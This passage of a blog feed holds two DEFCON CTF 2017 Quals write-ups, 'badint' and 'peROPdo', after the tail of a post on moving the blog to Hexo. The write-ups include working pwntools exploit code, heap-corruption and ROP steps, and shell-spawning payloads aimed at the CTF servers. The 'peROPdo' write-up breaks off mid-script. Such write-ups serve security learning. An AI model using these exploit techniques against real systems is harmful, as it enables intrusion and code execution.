  &lt;li&gt;Export all the markdown files from Logdown.&lt;/li&gt;
  &lt;li&gt;Write some script to convert the posts’ header ( author, tags, categories…etc ).&lt;/li&gt;
  &lt;li&gt;Move those files to the &lt;a href=&quot;https://github.com/bruce30262/bruce30262_blog&quot;&gt;bruce30262_blog&lt;/a&gt; repository.&lt;/li&gt;
  &lt;li&gt;Commit, push &amp;amp; deploy.&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;reference&quot;&gt;Reference&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;Github Pages + Hexo Tutorial
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://linghucong.js.org/2016/04/15/2016-04-15-hexo-github-pages-blog/&quot;&gt;link1&lt;/a&gt; (Chinese)&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://xuanwo.org/2015/03/26/hexo-intor/&quot;&gt;link2&lt;/a&gt; (Chinese)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://phriscage.github.io/2016/01/18/Hexo-blog-development-on-Docker/&quot;&gt;Hexo blog development on Docker&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/hexojs/hexo/issues/2505&quot;&gt;Execute npm install hexo-cli -g promt ERR (root user)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://fionat.github.io/2016/04/02/sitemap/&quot;&gt;Hexo sitemap&lt;/a&gt; (Chinese)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://hanhailong.com/2015/10/08/Hexo%E2%80%94%E6%AD%A3%E7%A1%AE%E6%B7%BB%E5%8A%A0RSS%E8%AE%A2%E9%98%85/&quot;&gt;Hexo rss feed&lt;/a&gt; (Chinese)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/iissnan/hexo-theme-next&quot;&gt;Hexo NexT theme github page&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/iissnan/hexo-theme-next/pull/660&quot;&gt;Add AddThis to Hexo-NexT-theme&lt;/a&gt; (Chinese)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://help.disqus.com/customer/portal/articles/286778-migration-tools&quot;&gt;Disqus Migration Tools&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Bruce Chen</name></author><category term="Hexo" /><category term="node.js" /><category term="git" /><category term="docker" /><category term="NexT" /><summary type="html">So I finally decided to migrate my blog from Logdown to Github Pages. Took me about three days to get it done. Here I write down some notes to record the whole migration process.</summary></entry><entry><title type="html">DEFCON CTF 2017 Quals – badint</title><link href="http://0.0.0.0:4000/1784522/" rel="alternate" type="text/html" title="DEFCON CTF 2017 Quals -- badint" /><published>2017-05-02T22:59:00+08:00</published><updated>2017-05-02T22:59:00+08:00</updated><id>http://0.0.0.0:4000/1784522</id><content type="html" xml:base="http://0.0.0.0:4000/1784522/">&lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; Potent Pwnables&lt;/p&gt;

&lt;p&gt;64 bit ELF, Partial RELRO, NX enabled, No canary &amp;amp; PIE. &lt;strong&gt;libc not provided&lt;/strong&gt;.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;This C++ program will read some input from user, then store the data into the heap memory:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./badint 
SEQ #: 0
Offset: 0
Data: AAAAAAA
LSF Yes/No: Yes
RX PDU [0] [len=4]
Assembled [seq: 0]: aaaaaa0a

SEQ #: 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Notice that if we input data &lt;code class=&quot;highlighter-rouge&quot;&gt;AAAA&lt;/code&gt;, the program will convert &lt;code class=&quot;highlighter-rouge&quot;&gt;AAAA&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;0xaaaa&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;According to my teammate, the following input will crash the program:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SEQ #: 1
Offset: 0
Data: 0000000000000000000000000000000000000000000000000000000000000
LSF Yes/No: Yes
RX PDU [1] [len=31]
Assembled [seq: 1]: 00000000000000000000000000000000000000000000000000000000000000

SEQ #: 1
Offset: 0
Data: 111111111111111111111111111111111111111
LSF Yes/No: Yes
RX PDU [1] [len=20]
Assembled [seq: 1]: 1111111111111111111111111111111111111101

SEQ #: 1
Offset: 18
Data: 22222222222222222222222
LSF Yes/No: Yes
RX PDU [1] [len=12]
Assembled [seq: 1]: 000000000000000022222202

*** Error in `./badint': free(): invalid next size (fast): 0x000000000224a0c0 ***
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After done some analyzing, we found the vulnerability:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// &amp;lt;-- Here !!
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The program use &lt;code class=&quot;highlighter-rouge&quot;&gt;memcpy(new_buf + offset, data, len)&lt;/code&gt; to copy the input data into a heap buffer. The variable &lt;code class=&quot;highlighter-rouge&quot;&gt;offet&lt;/code&gt; can be controlled by us, and thus lead to a &lt;strong&gt;heap overflow vulnerability&lt;/strong&gt;. The program crashed due to the &lt;code class=&quot;highlighter-rouge&quot;&gt;size&lt;/code&gt; metadata was overwritten into an invalid size, causing the &lt;code class=&quot;highlighter-rouge&quot;&gt;free()&lt;/code&gt; function aborted the program.&lt;/p&gt;

&lt;p&gt;Now we spot the vulnerability, time to exploit the service. First we’ll have to leak some address. Here I leaked the libc’s address by doing the following:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./badint 
SEQ #: 1
Offset: 8
Data: 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
LSF Yes/No: Yes
RX PDU [1] [len=144]
Assembled [seq: 1]: 788ba4952b7f000011111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111

SEQ #:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here we set the offset to 8, so the data we input will copy to &lt;code class=&quot;highlighter-rouge&quot;&gt;heap_buf+8&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;heap_buf&lt;/code&gt; is a chunk in unsortbin which will be allocated for storing our input data, and thus its &lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; &amp;amp; &lt;code class=&quot;highlighter-rouge&quot;&gt;bk&lt;/code&gt; will contain the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;main_arena+88&lt;/code&gt;. We copy the data to &lt;code class=&quot;highlighter-rouge&quot;&gt;heap_buf+8&lt;/code&gt;, means that &lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; will not be overwritten, and so we could leak the libc’s address by printing out the assembled data.&lt;/p&gt;

&lt;p&gt;The next step is to try hijack the program control flow. Here I decided to use the fastbin corruption attack. First we’ll have to arrange the following heap memory layout:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ hip
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0xc26cc0 --&amp;gt; 0x0
(0x40)     fastbin[2]: 0xc26c80 --&amp;gt; 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0xc26c20 --&amp;gt; 0x0   
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0xc26f10 (size : 0x1c0f0) 
       last_remainder: 0xc26e00 (size : 0x50) 
            unsortbin: 0x0
gdb-peda$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By using the amazing &lt;a href=&quot;https://github.com/scwuaptx/Pwngdb/tree/master/angelheap&quot;&gt;angelheap&lt;/a&gt; from &lt;a href=&quot;https://github.com/scwuaptx/Pwngdb&quot;&gt;Pwngdb&lt;/a&gt;, we could see that there’s a chunk in &lt;code class=&quot;highlighter-rouge&quot;&gt;fastbin[4]&lt;/code&gt;(size = 0x60), and a chunk in &lt;code class=&quot;highlighter-rouge&quot;&gt;fastbin[2]&lt;/code&gt;(size = 0x40).&lt;/p&gt;

&lt;p&gt;Then, we allocate the chunk in &lt;code class=&quot;highlighter-rouge&quot;&gt;fastbin[4]&lt;/code&gt;, and copy our data into the chunk. Since there’s a heap overflow vulnerability, we can actually overwrite the data in chunk @ &lt;code class=&quot;highlighter-rouge&quot;&gt;fastbin[2]&lt;/code&gt; – by setting the &lt;code class=&quot;highlighter-rouge&quot;&gt;offet&lt;/code&gt; variable to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x60&lt;/code&gt; ( &lt;code class=&quot;highlighter-rouge&quot;&gt;0xc26c20&lt;/code&gt; + &lt;code class=&quot;highlighter-rouge&quot;&gt;0x60&lt;/code&gt; = &lt;code class=&quot;highlighter-rouge&quot;&gt;0xc26c80&lt;/code&gt; ). We overwrite the &lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; pointer in chunk @ &lt;code class=&quot;highlighter-rouge&quot;&gt;fastbin[2]&lt;/code&gt;, making it point to the GOT area. This is because in an x64 non-PIE binary, its GOT entries will contain some address which start with &lt;code class=&quot;highlighter-rouge&quot;&gt;0x40&lt;/code&gt; (if the function hasn’t been resolved yet):&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ tel 0x604018
00:0000|  0x604018 --&amp;gt; 0x7fbdea10c800 (&amp;lt;__printf&amp;gt;:      sub    rsp,0xd8)
-------------------------------------------------------------------------
01:0008|  0x604020 --&amp;gt; 0x400ab6 (&amp;lt;__gmon_start__@plt+6&amp;gt;:        push   0x1)
-------------------------------------------------------------------------
02:0016|  0x604028 --&amp;gt; 0x7fbdea126690 (&amp;lt;_IO_puts&amp;gt;:      push   r12)
03:0024|  0x604030 --&amp;gt; 0x7fbdea723f10 (&amp;lt;operator new[](unsigned long)&amp;gt;: sub    rsp,0x8)
04:0032|  0x604038 --&amp;gt; 0x7fbdea721f10 (&amp;lt;operator delete(void*)&amp;gt;:        jmp    0x7fbdea71ddb0 &amp;lt;free@plt&amp;gt;)
05:0040|  0x604040 --&amp;gt; 0x7fbdea126e70 (&amp;lt;__GI__IO_setvbuf&amp;gt;:      push   rbp)
-------------------------------------------------------------------------
06:0048|  0x604048 --&amp;gt; 0x400b06 (&amp;lt;fopen@plt+6&amp;gt;: push   0x6)
-------------------------------------------------------------------------
07:0056|  0x604050 --&amp;gt; 0x7fbdea0d7740 (&amp;lt;__libc_start_main&amp;gt;:     push   r14)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;If we off-set the memory layout in the GOT area, we could found that it actually has some good &lt;code class=&quot;highlighter-rouge&quot;&gt;fastbin[2]&lt;/code&gt;(again, size = 0x40) chunks:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x604042 &amp;lt;setvbuf@got.plt+2&amp;gt;:   0x0b0600007fbdea12      0x7740000000000040  &amp;lt;-- here
0x604052 &amp;lt;__libc_start_main@got.plt+2&amp;gt;: 0x4ad000007fbdea0d      0x1b7000007fbdea12
0x604062 &amp;lt;strlen@got.plt+2&amp;gt;:    0xdea000007fbdea14      0xc3c000007fbdea0e
0x604072 &amp;lt;signal@got.plt+2&amp;gt;:    0x0b6600007fbdea0e      0x2650000000000040 &amp;lt;-- here
0x604082 &amp;lt;alarm@got.plt+2&amp;gt;:     0x0b8600007fbdea18      0x0b96000000000040 &amp;lt;-- here
0x604092 &amp;lt;dlsym@got.plt+2&amp;gt;:     0x0ba6000000000040      0x0bb6000000000040 &amp;lt;-- and here !
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;While allocating a fastbin chunk, &lt;strong&gt;malloc.c will only check if its size is valid&lt;/strong&gt;. For example, a chunk in &lt;code class=&quot;highlighter-rouge&quot;&gt;fastbin[2]&lt;/code&gt; must have a size of &lt;code class=&quot;highlighter-rouge&quot;&gt;0x4X&lt;/code&gt; ( yep, even a size of &lt;code class=&quot;highlighter-rouge&quot;&gt;0x4f&lt;/code&gt; will still pass the check). So, after we overwrite the &lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; pointer in the chunk @ &lt;code class=&quot;highlighter-rouge&quot;&gt;fastbin[2]&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ hip
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x1da3cc0 --&amp;gt; 0x0
(0x40)     fastbin[2]: 0x1da3c80 --&amp;gt; 0x604042 (size error (0xc740000000000040)) --&amp;gt; 0x9ad000007f5e059a (invaild memory)
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x1da3c20 --&amp;gt; 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x1da3f80 (size : 0x1c080) 
       last_remainder: 0x1da3e00 (size : 0x50) 
            unsortbin: 0x0
gdb-peda$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;We could see that &lt;code class=&quot;highlighter-rouge&quot;&gt;fastbin[2]&lt;/code&gt; will have a fake chunk @ &lt;code class=&quot;highlighter-rouge&quot;&gt;0x604042&lt;/code&gt; ( no need to worry about the size, &lt;strong&gt;malloc.c&lt;/strong&gt; will only check the size with type &lt;code class=&quot;highlighter-rouge&quot;&gt;unsigned int&lt;/code&gt; , just focus on the first 4 bytes ).&lt;/p&gt;

&lt;p&gt;Later we could just allocate the chunk in &lt;code class=&quot;highlighter-rouge&quot;&gt;fastbin[2]&lt;/code&gt;. Once we allocate &lt;code class=&quot;highlighter-rouge&quot;&gt;0x604042&lt;/code&gt;, we’ll be able to overwrite the GOT entry by copying our data into the fake fastbin chunk.&lt;/p&gt;

&lt;p&gt;But there’s one more problem: we don’t know the version of the libc. The libc address we leaked is the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;main_arena+88&lt;/code&gt;, neither &lt;a href=&quot;https://github.com/niklasb/libc-database&quot;&gt;libc-database&lt;/a&gt; nor &lt;a href=&quot;http://libcdb.com/&quot;&gt;libcdb.com&lt;/a&gt; can find the libc version with this symbol’s address.&lt;/p&gt;

&lt;p&gt;So we’ll have to leak more addresses. However, although we can modify a function’s GOT, there’s no way we can store a GOT entry’s address in the function parameter. Luckily, I still managed to figure out the solution: &lt;strong&gt;by using the format string vulnerability.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We could modify &lt;code class=&quot;highlighter-rouge&quot;&gt;atol@got.plt&lt;/code&gt; into &lt;code class=&quot;highlighter-rouge&quot;&gt;printf@got.plt&lt;/code&gt;, which will turn &lt;code class=&quot;highlighter-rouge&quot;&gt;atol(our_input)&lt;/code&gt; into &lt;code class=&quot;highlighter-rouge&quot;&gt;printf(our_input)&lt;/code&gt;, &lt;strong&gt;thus we create a format string vulnerability, and we can use the vulnerability to leak an arbitrary address.&lt;/strong&gt; By doing this, I was able to leak some GOT entries and found the correct version of libc at &lt;a href=&quot;http://libcdb.com/&quot;&gt;libcdb.com&lt;/a&gt;. After that is simple, we could just hijack &lt;code class=&quot;highlighter-rouge&quot;&gt;atol&lt;/code&gt;’s GOT and call &lt;code class=&quot;highlighter-rouge&quot;&gt;system('sh')&lt;/code&gt; by entering “sh”.&lt;/p&gt;

&lt;p&gt;```python exp_bad.py
#!/usr/bin/env python&lt;/p&gt;

&lt;p&gt;from pwn import *
import subprocess
import sys
import time&lt;/p&gt;

&lt;p&gt;HOST = “badint_7312a689cf32f397727635e8be495322.quals.shallweplayaga.me”
PORT = 21813
ELF_PATH = “./badint”
#LIBC_PATH = “/lib/x86_64-linux-gnu/libc.so.6”
LIBC_PATH = “./libc-2.19_15.so”&lt;/p&gt;

&lt;p&gt;context.binary = ELF_PATH
context.log_level = ‘INFO’ # [‘CRITICAL’, ‘DEBUG’, ‘ERROR’, ‘INFO’, ‘NOTSET’, ‘WARN’, ‘WARNING’]
context.terminal = [‘tmux’, ‘splitw’] # for gdb.attach&lt;/p&gt;

&lt;p&gt;elf = context.binary # context.binary is an ELF object
libc = ELF(LIBC_PATH)&lt;/p&gt;

&lt;p&gt;def add_data(seq, off, data, lsf):
    r.sendlineafter(“SEQ #:”, str(seq))
    r.sendlineafter(“Offset: “, str(off))
    r.sendlineafter(“Data: “, data)
    r.sendlineafter(“Yes/No: “, lsf)&lt;/p&gt;

&lt;p&gt;def convert(num):
    ret = “”
    while num != 0:
        now = num &amp;amp; 0xff
        num »= 8
        ret = ret + ‘‘.format(now)
    return ret.ljust(16, “0”)&lt;/p&gt;

&lt;p&gt;if &lt;strong&gt;name&lt;/strong&gt; == “&lt;strong&gt;main&lt;/strong&gt;”:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r = remote(HOST, PORT)
#r = process(ELF_PATH)

add_data(1, 8, &quot;1&quot;*0x90*2, 'Yes')
r.recvuntil(&quot;Assembled [seq: 1]: &quot;)
# leak libc address
addr = 0
for i in xrange(6):
    addr |= ((int(r.recv(2), 16)) &amp;lt;&amp;lt; (i*8))

log.success(&quot;addr: &quot; +hex(addr))
# libc.address = addr - 0x3c3b78 # local
libc.address = addr - 0x3be7b8 # remote
log.success(&quot;libc_base: &quot; +hex(libc.address))
# gdb.attach(r, gdbscript=open('./ggg', 'r'))
# arrange heap
add_data(2, 0, &quot;2&quot;*0xb0*2, 'Yes')
add_data(2, 0, &quot;3&quot;*0x58*2, 'Yes')
add_data(2, 0, &quot;4&quot;*0x38*2, 'Yes')
# overwrite fastbin-&amp;gt;fd ( in size 0x40 )
payload = convert(0x41)
payload += convert(0x604042)
payload += convert(0) * 6
payload += convert(0x31)
payload = payload.ljust(0x58*2, '0')
add_data(2, 0x60-0x8, payload, 'Yes')
# now fastbin (size=0x40) has fake chunk @ got
# allocate the fake chunk
# overwrite got
payload = &quot;6&quot;*12 # libc_start_main
payload += convert(0x400b26) # resolve fgets
payload += convert(0x400b36) # resolve strlen
payload += convert(libc.symbols['system']) # hijack atol
#payload += convert(elf.plt['printf']) # use format string to leak libc info
payload = payload.ljust(110, '0')
add_data(3, 8, payload, 'No')

# hijack atol, send &quot;sh&quot; to get shell
r.sendlineafter(&quot;SEQ #:&quot;, &quot;sh&quot;)
log.success(&quot;get shell!: &quot;)
r.interactive()

# for exploiting format string &amp;amp; leak libc info
&quot;&quot;&quot;
payload = &quot;%10$s.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot; + p64(elf.got['fgets'])
r.sendlineafter(&quot;SEQ #:&quot;, payload)
r.recv(1)
print &quot;fgets:&quot;, hex(u64(r.recv(6).ljust(8, '\x00')))
payload = &quot;%10$s.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot; + p64(elf.got['puts'])
r.sendlineafter(&quot;Offset:&quot;, payload)
r.recv(1)
print &quot;puts:&quot;, hex(u64(r.recv(6).ljust(8, '\x00')))
&quot;&quot;&quot; ```
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;flag: &lt;code class=&quot;highlighter-rouge&quot;&gt;All ints are not the same... A239... Some can be bad ints!&lt;/code&gt;&lt;/p&gt;</content><author><name>Bruce Chen</name></author><category term="Python" /><category term="CTF" /><category term="Pwnable" /><category term="DEFCON" /><category term="heap" /><category term="heap_overflow" /><category term="CPP" /><summary type="html">Category: Potent Pwnables</summary></entry><entry><title type="html">DEFCON CTF 2017 Quals – peROPdo</title><link href="http://0.0.0.0:4000/1784510/" rel="alternate" type="text/html" title="DEFCON CTF 2017 Quals -- peROPdo" /><published>2017-05-02T22:58:00+08:00</published><updated>2017-05-02T22:58:00+08:00</updated><id>http://0.0.0.0:4000/1784510</id><content type="html" xml:base="http://0.0.0.0:4000/1784510/">&lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; Potent Pwnables&lt;/p&gt;

&lt;p&gt;32 bit ELF, static link, stripped, NX enabled, No PIE &amp;amp; canary.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;The program is a “rolling dice” program. First we input our name, then the program will ask us how many dice would we like to roll. After we input a number, the program will start generating some random data, then store them on the stack memory. The program will then print out &lt;code class=&quot;highlighter-rouge&quot;&gt;data[i] % 6 + 1&lt;/code&gt;, which represent the numbers we roll in this round.&lt;/p&gt;

&lt;p&gt;There’re two vulnerabilities in the program. First it use &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf(&quot;%s&quot;, name)&lt;/code&gt; to read our name, which lead to buffer overflow in the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; buffer. Then, if we input a number that is larger than &lt;strong&gt;23&lt;/strong&gt;, the data that program generated will overflow the &lt;code class=&quot;highlighter-rouge&quot;&gt;data[i]&lt;/code&gt; buffer and &lt;strong&gt;thus overwrite the return address&lt;/strong&gt; ( it will be a random data though ).&lt;/p&gt;

&lt;p&gt;Since the binary was stripped, I wasn’t sure which algorithm the program used for randomizing, the only thing I knew is that the algorithm will use our name to generate the random data. At that moment, I thought it was just some self-implement function ( which is &lt;strong&gt;NOT&lt;/strong&gt; correct, we’ll get into that later).&lt;/p&gt;

&lt;p&gt;And so I thought “Hmmm, maybe I could use some symbolic execution tool to calculate the address I want to return, and do the ROP attack”. &lt;strong&gt;This was such a huge mistake&lt;/strong&gt;, since I’m not familiar with any of the symbolic execution tools – &lt;a href=&quot;http://angr.io/&quot;&gt;angr&lt;/a&gt;, &lt;a href=&quot;https://github.com/JonathanSalwan/Triton&quot;&gt;Triton&lt;/a&gt;, not to mention the fresh out &lt;a href=&quot;https://github.com/trailofbits/manticore&quot;&gt;manticore&lt;/a&gt;. Even worse, all of the tool failed to calculate the address – Triton and manticore couldn’t even execute the program, it just crashed :(&lt;/p&gt;

&lt;p&gt;After wasting lots of time with those symbolic execution tools, I decided to try something different – the first vulnerability: overflowing the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; buffer. And the result was encouraging – since I found that I could hijack the control flow by using the &lt;code class=&quot;highlighter-rouge&quot;&gt;call reg&lt;/code&gt; and the &lt;code class=&quot;highlighter-rouge&quot;&gt;call [reg+offset]&lt;/code&gt; gadget ( we can control the content of several registers ). It seems that there’re some &lt;code class=&quot;highlighter-rouge&quot;&gt;FILE*&lt;/code&gt; pointer behind the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; buffer, so we can exploit the service by &lt;a href=&quot;https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/&quot;&gt;abusing the FILE structure&lt;/a&gt; ( we can’t control the function parameters though).&lt;/p&gt;

&lt;p&gt;Here I chose to use the second gadget ( &lt;code class=&quot;highlighter-rouge&quot;&gt;call [reg+offset]&lt;/code&gt; ), since when the program execute to that line of code, its second parameter will be the &lt;code class=&quot;highlighter-rouge&quot;&gt;FILE*&lt;/code&gt; pointer of &lt;code class=&quot;highlighter-rouge&quot;&gt;stdout&lt;/code&gt;. I control the &lt;code class=&quot;highlighter-rouge&quot;&gt;eip&lt;/code&gt; and jump to the middle of the main function:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mov     dword ptr [esp+4], offset name
mov     dword ptr [esp], (offset aSSSS+8) ; &quot;%s&quot; &amp;lt;--- I jump to here
call    scanf
mov     eax, ds:name
mov     [esp], eax
call    sub_0804baf0
mov     dword ptr [esp], offset name
call    do_main
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This will make the program store the &lt;code class=&quot;highlighter-rouge&quot;&gt;%s&lt;/code&gt; string to the first parameter, then call the &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf&lt;/code&gt; function, making the program calling &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf(&quot;%s&quot;, stdout)&lt;/code&gt; – and thus we can control the content of &lt;code class=&quot;highlighter-rouge&quot;&gt;stdout&lt;/code&gt; !&lt;/p&gt;

&lt;p&gt;By crafting &lt;code class=&quot;highlighter-rouge&quot;&gt;stdout&lt;/code&gt;, we can actually hijack the control flow, while having the first parameter controlled. This allowed us to do some advanced ROP attack. Here’s what I did after I controlled the &lt;code class=&quot;highlighter-rouge&quot;&gt;eip&lt;/code&gt;:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Jump to &lt;code class=&quot;highlighter-rouge&quot;&gt;xchg esp, eax&lt;/code&gt; gadget, migrate the stack to &lt;code class=&quot;highlighter-rouge&quot;&gt;stdout&lt;/code&gt; (which now controlled by us)&lt;/li&gt;
  &lt;li&gt;Use &lt;code class=&quot;highlighter-rouge&quot;&gt;add esp, offset&lt;/code&gt; to skip the uncontrollable member data in &lt;code class=&quot;highlighter-rouge&quot;&gt;stdout&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Since it’s a static linked binary, it’s easy for us to find some gadgets and do the &lt;strong&gt;open/read/write&lt;/strong&gt; syscall, making the service print out the flag of the challenge. (The &lt;strong&gt;execve&lt;/strong&gt; syscall seems to be filtered out in this challenge)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Final exploit:&lt;br /&gt;
```python exp_peropdo.py 
#!/usr/bin/env python&lt;/p&gt;

&lt;p&gt;from pwn import *
import subprocess
import sys
import time&lt;/p&gt;

&lt;p&gt;HOST = “peropdo_bb53b90b35dba86353af36d3c6862621.quals.shallweplayaga.me”
PORT = 80
ELF_PATH = “./peropdo”&lt;/p&gt;

&lt;p&gt;context.binary = ELF_PATH
